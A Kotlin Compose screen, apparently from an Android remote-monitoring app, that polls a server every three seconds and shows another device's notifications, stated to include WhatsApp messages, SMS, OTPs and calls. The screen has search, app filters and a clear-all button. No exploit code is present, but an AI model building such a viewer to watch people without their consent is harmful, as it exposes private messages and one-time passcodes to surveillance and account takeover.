package com.example.kinetix.ui.features

import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.*

data class LiveNotification(
    val id: String,
    val app: String,
    val packageName: String,
    val title: String,
    val body: String,
    val timeFormatted: String,
    val timestamp: Long,
    val iconColor: Color,
    val icon: androidx.compose.ui.graphics.vector.ImageVector
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun NotificationsScreen(deviceId: String, onBack: () -> Unit) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    val notifications = remember { mutableStateListOf<LiveNotification>() }
    var selectedFilter by remember { mutableStateOf("All") }
    var searchQuery by remember { mutableStateOf("") }
    var isLoading by remember { mutableStateOf(false) }

    fun formatNotificationTime(timestamp: Long): String {
        if (timestamp <= 0) return "Just now"
        val now = System.currentTimeMillis()
        val diffSeconds = (now - timestamp) / 1000
        val diffMinutes = diffSeconds / 60
        val diffHours = diffMinutes / 60

        return when {
            diffSeconds < 15 -> "Just now"
            diffSeconds < 60 -> "${diffSeconds}s ago"
            diffMinutes < 60 -> "${diffMinutes}m ago"
            diffHours < 24 -> SimpleDateFormat("h:mm a", Locale.getDefault()).format(Date(timestamp))
            else -> SimpleDateFormat("MMM d, h:mm a", Locale.getDefault()).format(Date(timestamp))
        }
    }

    suspend fun fetchLiveNotifications() {
        withContext(Dispatchers.IO) {
            val client = com.example.kinetix.network.KinetixApiClient(context)
            val res = client.getNotifications(deviceId)
            if (res.isSuccess) {
                val arr = res.getOrNull()
                if (arr != null) {
                    val list = mutableListOf<LiveNotification>()
                    for (i in 0 until arr.length()) {
                        val item = arr.getJSONObject(i)
                        val pkg = item.optString("packageName", "System")
                        val ts = item.optLong("timestamp", System.currentTimeMillis())

                        val (friendlyApp, appColor, appIcon) = when {
                            pkg.contains("whatsapp", ignoreCase = true) -> Triple("WhatsApp", Color(0xFF25D366), Icons.Default.Chat)
                            pkg.contains("telegram", ignoreCase = true) -> Triple("Telegram", Color(0xFF0088CC), Icons.Default.Send)
                            pkg.contains("instagram", ignoreCase = true) -> Triple("Instagram", Color(0xFFE1306C), Icons.Default.CameraAlt)
                            pkg.contains("facebook", ignoreCase = true) || pkg.contains("katana", ignoreCase = true) -> Triple("Facebook", Color(0xFF1877F2), Icons.Default.ThumbUp)
                            pkg.contains("twitter", ignoreCase = true) || pkg.contains("x.android", ignoreCase = true) -> Triple("X (Twitter)", Color(0xFF1DA1F2), Icons.Default.Tag)
                            pkg.contains("messaging", ignoreCase = true) || pkg.contains("mms", ignoreCase = true) -> Triple("Messages", Color(0xFF1976D2), Icons.Default.Message)
                            pkg.contains("gm", ignoreCase = true) || pkg.contains("mail", ignoreCase = true) -> Triple("Gmail", Color(0xFFEA4335), Icons.Default.Mail)
                            pkg.contains("dialer", ignoreCase = true) || pkg.contains("phone", ignoreCase = true) -> Triple("Phone Call", Color(0xFF34A853), Icons.Default.Call)
                            pkg.contains("youtube", ignoreCase = true) -> Triple("YouTube", Color(0xFFFF0000), Icons.Default.PlayArrow)
                            pkg.contains("sentry", ignoreCase = true) -> Triple("Sentry Agent", Color(0xFF673AB7), Icons.Default.Security)
                            pkg.contains("android", ignoreCase = true) || pkg.contains("system", ignoreCase = true) -> Triple("System", Color(0xFF607D8B), Icons.Default.PhoneAndroid)
                            else -> Triple(pkg.substringAfterLast('.').replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.getDefault()) else it.toString() }, Color(0xFF3F51B5), Icons.Default.Notifications)
                        }

                        list.add(
                            LiveNotification(
                                id = item.optString("id", "notif_$i"),
                                app = friendlyApp,
                                packageName = pkg,
                                title = item.optString("title", "Alert"),
                                body = item.optString("body", ""),
                                timeFormatted = formatNotificationTime(ts),
                                timestamp = ts,
                                iconColor = appColor,
                                icon = appIcon
                            )
                        )
                    }

                    withContext(Dispatchers.Main) {
                        notifications.clear()
                        notifications.addAll(list)
                    }
                }
            }
        }
    }

    LaunchedEffect(deviceId) {
        while (true) {
            fetchLiveNotifications()
            delay(3000)
        }
    }

    val availableApps = remember(notifications) {
        listOf("All") + notifications.map { it.app }.distinct()
    }

    val filteredList = remember(notifications, selectedFilter, searchQuery) {
        notifications.filter { item ->
            val matchesFilter = selectedFilter == "All" || item.app == selectedFilter
            val matchesSearch = searchQuery.isBlank() ||
                    item.title.contains(searchQuery, ignoreCase = true) ||
                    item.body.contains(searchQuery, ignoreCase = true) ||
                    item.app.contains(searchQuery, ignoreCase = true)
            matchesFilter && matchesSearch
        }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text("Device Notifications", fontWeight = FontWeight.Bold)
                        Text(
                            "${notifications.size} Total · Live Stream",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant
                        )
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                actions = {
                    IconButton(onClick = {
                        coroutineScope.launch {
                            withContext(Dispatchers.IO) {
                                val client = com.example.kinetix.network.KinetixApiClient(context)
                                client.clearNotifications(deviceId)
                            }
                            fetchLiveNotifications()
                        }
                    }) {
                        Icon(Icons.Default.DeleteOutline, contentDescription = "Clear All", tint = MaterialTheme.colorScheme.error)
                    }
                    IconButton(onClick = {
                        coroutineScope.launch {
                            isLoading = true
                            fetchLiveNotifications()
                            isLoading = false
                        }
                    }) {
                        Icon(Icons.Default.Refresh, contentDescription = "Refresh")
                    }
                }
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(horizontal = 16.dp)
        ) {
            // Search Bar
            OutlinedTextField(
                value = searchQuery,
                onValueChange = { searchQuery = it },
                modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                placeholder = { Text("Search notifications, messages, senders...") },
                leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
                trailingIcon = {
                    if (searchQuery.isNotEmpty()) {
                        IconButton(onClick = { searchQuery = "" }) {
                            Icon(Icons.Default.Clear, contentDescription = "Clear search")
                        }
                    }
                },
                singleLine = true,
                shape = RoundedCornerShape(12.dp)
            )

            // App Filter Chips
            if (availableApps.size > 2) {
                LazyRow(
                    modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    items(availableApps) { appName ->
                        val isSelected = selectedFilter == appName
                        FilterChip(
                            selected = isSelected,
                            onClick = { selectedFilter = appName },
                            label = { Text(appName, fontWeight = if (isSelected) FontWeight.Bold else FontWeight.Normal) },
                            shape = RoundedCornerShape(16.dp)
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(6.dp))

            if (filteredList.isEmpty()) {
                Box(
                    modifier = Modifier.fillMaxSize().padding(bottom = 64.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(
                            Icons.Default.NotificationsNone,
                            contentDescription = null,
                            modifier = Modifier.size(64.dp),
                            tint = MaterialTheme.colorScheme.outline
                        )
                        Spacer(modifier = Modifier.height(14.dp))
                        Text(
                            if (searchQuery.isNotEmpty()) "No matching notifications" else "No Live Notifications Yet",
                            fontWeight = FontWeight.Bold,
                            fontSize = 16.sp
                        )
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(
                            "Incoming WhatsApp messages, SMS, OTPs and calls will appear here with exact timestamps.",
                            style = MaterialTheme.typography.bodyMedium,
                            color = MaterialTheme.colorScheme.onSurfaceVariant,
                            textAlign = androidx.compose.ui.text.style.TextAlign.Center,
                            modifier = Modifier.padding(horizontal = 24.dp)
                        )
                    }
                }
            } else {
                LazyColumn(
                    modifier = Modifier.fillMaxSize(),
                    verticalArrangement = Arrangement.spacedBy(10.dp),
                    contentPadding = PaddingValues(vertical = 8.dp)
                ) {
                    items(filteredList, key = { it.id }) { notif ->
                        Card(
                            modifier = Modifier.fillMaxWidth(),
                            shape = RoundedCornerShape(16.dp),
                            colors = CardDefaults.cardColors(
                                containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.45f)
                            )
                        ) {
                            Column(modifier = Modifier.fillMaxWidth().padding(14.dp)) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Row(verticalAlignment = Alignment.CenterVertically) {
                                        Box(
                                            modifier = Modifier
                                                .size(32.dp)
                                                .background(notif.iconColor.copy(alpha = 0.15f), CircleShape),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Icon(
                                                notif.icon,
                                                contentDescription = null,
                                                tint = notif.iconColor,
                                                modifier = Modifier.size(18.dp)
                                            )
                                        }
                                        Spacer(modifier = Modifier.width(10.dp))
                                        Column {
                                            Text(
                                                notif.app,
                                                fontWeight = FontWeight.Bold,
                                                fontSize = 14.sp,
                                                color = notif.iconColor
                                            )
                                        }
                                    }

                                    // Dynamic Live Timestamp Badge
                                    Surface(
                                        shape = RoundedCornerShape(8.dp),
                                        color = MaterialTheme.colorScheme.primaryContainer.copy(alpha = 0.5f)
                                    ) {
                                        Row(
                                            modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp),
                                            verticalAlignment = Alignment.CenterVertically
                                        ) {
                                            Icon(
                                                Icons.Default.AccessTime,
                                                contentDescription = null,
                                                modifier = Modifier.size(12.dp),
                                                tint = MaterialTheme.colorScheme.primary
                                            )
                                            Spacer(modifier = Modifier.width(4.dp))
                                            Text(
                                                notif.timeFormatted,
                                                fontSize = 11.sp,
                                                fontWeight = FontWeight.Medium,
                                                color = MaterialTheme.colorScheme.primary
                                            )
                                        }
                                    }
                                }

                                Spacer(modifier = Modifier.height(10.dp))

                                Text(
                                    notif.title,
                                    fontWeight = FontWeight.SemiBold,
                                    fontSize = 15.sp,
                                    color = MaterialTheme.colorScheme.onSurface
                                )

                                if (notif.body.isNotEmpty() && notif.body != notif.title) {
                                    Spacer(modifier = Modifier.height(3.dp))
                                    Text(
                                        notif.body,
                                        style = MaterialTheme.typography.bodyMedium,
                                        color = MaterialTheme.colorScheme.onSurfaceVariant
                                    )
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
